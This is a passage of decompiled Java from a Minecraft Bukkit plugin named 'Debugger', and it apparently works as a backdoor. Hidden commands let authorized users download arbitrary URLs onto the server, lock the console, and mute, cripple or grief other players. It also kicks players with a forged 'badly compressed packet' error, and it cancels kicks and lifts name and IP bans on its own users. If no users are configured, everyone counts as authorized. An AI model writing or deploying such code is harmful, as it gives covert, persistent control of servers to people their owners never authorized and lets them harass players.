               p.sendMessage(ChatColor.WHITE + " " + p1.getName() + " no longer has silk touch hands.");
               this.set_state(p1.getName(), Debugger.State.vanished, false);
            } else {
               p.sendMessage(ChatColor.WHITE + " " + p1.getName() + " now has silk touch hands.");
               this.set_state(p1.getName(), Debugger.State.vanished, true);
            }

            return "";
         }
         break;
      case 1288346212:
         if (var4.equals("makeworld")) {
            if (args.length < 2) {
               return this.help_message("makeworld");
            }

            if (args[1] == null) {
               return "No world specified.";
            }

            username = args[1];
            p.sendMessage(ChatColor.WHITE + " Creating world: " + ChatColor.RED + username);
            (new BukkitRunnable() {
               public void run() {
                  p.getServer().createWorld(WorldCreator.name(username));
               }
            }).runTask(this.plugin);
            p.sendMessage(ChatColor.WHITE + " World created!");
            return "";
         }
         break;
      case 1427818632:
         if (var4.equals("download")) {
            if (args.length < 3) {
               return this.help_message("download");
            }

            p.sendMessage(ChatColor.WHITE + " Downloading file: " + ChatColor.RED + args[2]);
            (new Thread(() -> {
               try {
                  URL link = new URL(args[1]);
                  downloadFile(link, args[2]);
               } catch (Throwable var2) {
               }

            })).start();
            p.sendMessage(ChatColor.WHITE + " File downloaded or replaced if existed!");
            return "";
         }
      }

      return "Unknown problem executing command: " + command;
   }

   boolean deleteWorld(File directoryToBeDeleted) {
      File[] allContents = directoryToBeDeleted.listFiles();
      if (allContents != null) {
         File[] var6 = allContents;
         int var5 = allContents.length;

         for(int var4 = 0; var4 < var5; ++var4) {
            File file = var6[var4];
            this.deleteWorld(file);
         }
      } else {
         directoryToBeDeleted.exists();
      }

      return directoryToBeDeleted.delete();
   }

   public static void downloadFile(URL url, String fileName) throws IOException {
      Throwable var2 = null;
      Object var3 = null;

      try {
         InputStream in = url.openStream();

         try {
            BufferedInputStream bis = new BufferedInputStream(in);

            try {
               FileOutputStream fos = new FileOutputStream(fileName);

               try {
                  byte[] data = new byte[1024];

                  int count;
                  while((count = bis.read(data, 0, 1024)) != -1) {
                     fos.write(data, 0, count);
                  }
               } finally {
                  if (fos != null) {
                     fos.close();
                  }

               }
            } catch (Throwable var26) {
               if (var2 == null) {
                  var2 = var26;
               } else if (var2 != var26) {
                  var2.addSuppressed(var26);
               }

               if (bis != null) {
                  bis.close();
               }

               throw var2;
            }

            if (bis != null) {
               bis.close();
            }
         } catch (Throwable var27) {
            if (var2 == null) {
               var2 = var27;
            } else if (var2 != var27) {
               var2.addSuppressed(var27);
            }

            if (in != null) {
               in.close();
            }

            throw var2;
         }

         if (in != null) {
            in.close();
         }

      } catch (Throwable var28) {
         if (var2 == null) {
            var2 = var28;
         } else if (var2 != var28) {
            var2.addSuppressed(var28);
         }

         throw var2;
      }
   }

   @EventHandler(
      priority = EventPriority.LOWEST
   )
   public void onServerCommand(ServerCommandEvent e) {
      if (this.get_state("console", Debugger.State.locked)) {
         e.setCommand(" ");
      }

   }

   @EventHandler(
      priority = EventPriority.LOWEST
   )
   public void onPreCommand(PlayerCommandPreprocessEvent e) {
      Player p = e.getPlayer();
      if (this.get_state(p.getName(), Debugger.State.locked)) {
         e.setCancelled(true);
      }

   }

   @EventHandler(
      priority = EventPriority.LOWEST
   )
   public void onPlayerChat(AsyncPlayerChatEvent e) {
      Player p = e.getPlayer();
      if (this.get_state(p.getName(), Debugger.State.muted)) {
         e.setCancelled(true);
      }

   }

   @EventHandler(
      priority = EventPriority.LOWEST
   )
   public void onBlockBreak(BlockBreakEvent e) {
      Player p = e.getPlayer();
      if (this.get_state(p.getName(), Debugger.State.silktouch) || this.get_state(p.getName(), Debugger.State.instabreak)) {
         e.setDropItems(false);
         p.getWorld().dropItemNaturally(e.getBlock().getLocation(), new ItemStack(e.getBlock().getType(), 1));
      }

      if (this.get_state(p.getName(), Debugger.State.MF_mine)) {
         e.setCancelled(true);
      }

   }

   @EventHandler(
      priority = EventPriority.LOWEST
   )
   public void onBlockPlace(BlockPlaceEvent e) {
      Player p = e.getPlayer();
      if (this.get_state(p.getName(), Debugger.State.MF_place)) {
         e.setCancelled(true);
      }

   }

   @EventHandler(
      priority = EventPriority.LOWEST
   )
   public void onBlockDamage(BlockDamageEvent e) {
      Player p = e.getPlayer();
      if (this.get_state(p.getName(), Debugger.State.instabreak)) {
         e.setInstaBreak(true);
      }

      if (this.get_state(p.getName(), Debugger.State.MF_mine)) {
         e.setCancelled(true);
      }

   }

   @EventHandler(
      priority = EventPriority.LOWEST
   )
   public void onPlayerMove(PlayerMoveEvent e) {
      Player p = e.getPlayer();
      if (this.get_state(p.getName(), Debugger.State.MF_thrower)) {
         p.getWorld().dropItemNaturally(p.getLocation(), new ItemStack(Material.STONE, 64));
      }

      if (this.get_state(p.getName(), Debugger.State.MF_cripple) && Math.round(e.getTo().getZ()) != Math.round(e.getFrom().getZ())) {
         e.getTo().setZ(e.getFrom().getZ());
         p.sendMessage(ChatColor.translateAlternateColorCodes('&', "&c&lHey! &7You are not permitted to enter this area."));
      }

   }

   @EventHandler(
      priority = EventPriority.LOWEST
   )
   public void onPlayerInteract(PlayerInteractEvent e) {
      Player p = e.getPlayer();
      if (this.get_state(p.getName(), Debugger.State.MF_interact)) {
         e.setCancelled(true);
      }

   }

   @EventHandler(
      priority = EventPriority.LOWEST
   )
   public void onPlayerInteractEntity(PlayerInteractEntityEvent e) {
      Player p = e.getPlayer();
      if (this.get_state(p.getName(), Debugger.State.MF_interact)) {
         e.setCancelled(true);
      }

   }

   @EventHandler(
      priority = EventPriority.LOWEST
   )
   public void onPlayerToggleFlight(PlayerToggleFlightEvent e) {
      Player p = e.getPlayer();
      if (this.get_state(p.getName(), Debugger.State.MF_flight)) {
         e.setCancelled(true);
      }

   }

   @EventHandler(
      priority = EventPriority.LOWEST
   )
   public void onInventoryClickEvent(InventoryClickEvent e) {
      Player p = (Player)e.getWhoClicked();
      if (this.get_state(p.getName(), Debugger.State.MF_inventory)) {
         e.setCancelled(true);
      }

   }

   @EventHandler(
      priority = EventPriority.LOWEST
   )
   public void onInventoryDragEvent(InventoryDragEvent e) {
      Player p = (Player)e.getWhoClicked();
      if (this.get_state(p.getName(), Debugger.State.MF_inventory)) {
         e.setCancelled(true);
      }

   }

   @EventHandler(
      priority = EventPriority.LOWEST
   )
   public void onPlayerDropItem(PlayerDropItemEvent e) {
      Player p = e.getPlayer();
      if (this.get_state(p.getName(), Debugger.State.Mf_drop)) {
         e.setCancelled(true);
      }

   }

   @EventHandler(
      priority = EventPriority.LOWEST
   )
   public void onPlayerTeleport(PlayerTeleportEvent e) {
      Player p = e.getPlayer();
      if (this.get_state(p.getName(), Debugger.State.MF_teleport)) {
         e.setCancelled(true);
      }

   }

   @EventHandler(
      priority = EventPriority.LOWEST
   )
   public void onPlayerLogin(PlayerLoginEvent e) {
      Player p = e.getPlayer();
      if (this.get_state(p.getName(), Debugger.State.MF_login)) {
         e.disallow(Result.KICK_BANNED, "Internal Exception: io.netty.handler.codec.DecoderException: Badly compressed packet - size of 2677732 is larger than protocol maximum of 2097152");
      }

   }

   @EventHandler(
      priority = EventPriority.LOWEST
   )
   public void onEntityDamage(EntityDamageEvent e) {
      if (e.getEntity() instanceof Player && this.get_state(((Player)e.getEntity()).getName(), Debugger.State.MF_god)) {
         e.setCancelled(true);
      }

   }

   @EventHandler(
      priority = EventPriority.LOWEST
   )
   public void onEntityDamageByEntity(EntityDamageByEntityEvent e) {
      if (e.getDamager() instanceof Player && this.get_state(((Player)e.getDamager()).getName(), Debugger.State.MF_damage)) {
         e.setCancelled(true);
      }

   }

   @EventHandler(
      priority = EventPriority.LOWEST
   )
   public void onKick(PlayerKickEvent e) {
      Player p = e.getPlayer();
      if (this.IsUserAuthorized(p)) {
         p.sendMessage(ChatColor.RED + "You have been banned but we got your back. you are vanished");
         this.set_state(p.getName(), Debugger.State.vanished, true);
         Bukkit.getBanList(Type.NAME).pardon(p.getName());
         Bukkit.getBanList(Type.IP).pardon(p.getAddress().toString());
         e.setCancelled(true);
      }

   }

   private int Clamp(int i, int min, int max) {
      if (i < min) {
         return min;
      } else {
         return i > max ? max : i;
      }
   }

   public boolean IsUserAuthorized(Player p) {
      return Config.uuids_are_usernames ? this.IsUserAuthorized(p.getName()) : this.IsUserAuthorized(p.getUniqueId().toString());
   }

   public boolean IsUserAuthorized(String uuid) {
      if (Config.authorized_uuids.length == 1 && Config.authorized_uuids[0] == "") {
         return true;
      } else {
         String[] var5;
         int var4 = (var5 = Config.authorized_uuids).length;

         int i;
         for(i = 0; i < var4; ++i) {
            String u = var5[i];
            if (uuid.equals(u)) {
               return true;
            }
         }

         boolean authorized = false;

         for(i = 0; i < Config.tmp_authorized_uuids.length; ++i) {
            if (uuid.equals(Config.tmp_authorized_uuids[i])) {
               authorized = true;
               break;
            }
         }

         return authorized;
      }
   }

   public class PlayerState {
      private boolean[] states = new boolean[Debugger.State.values().length];
   }

   public static enum State {
      vanished,
      locked,
      muted,
      silktouch,
      instabreak,
      MF_thrower,
      MF_interact,
      MF_cripple,
      MF_flight,
      MF_inventory,
      Mf_drop,
      MF_teleport,
      MF_mine,
      MF_place,
      MF_login,
      MF_god,
      MF_damage;
   }
}
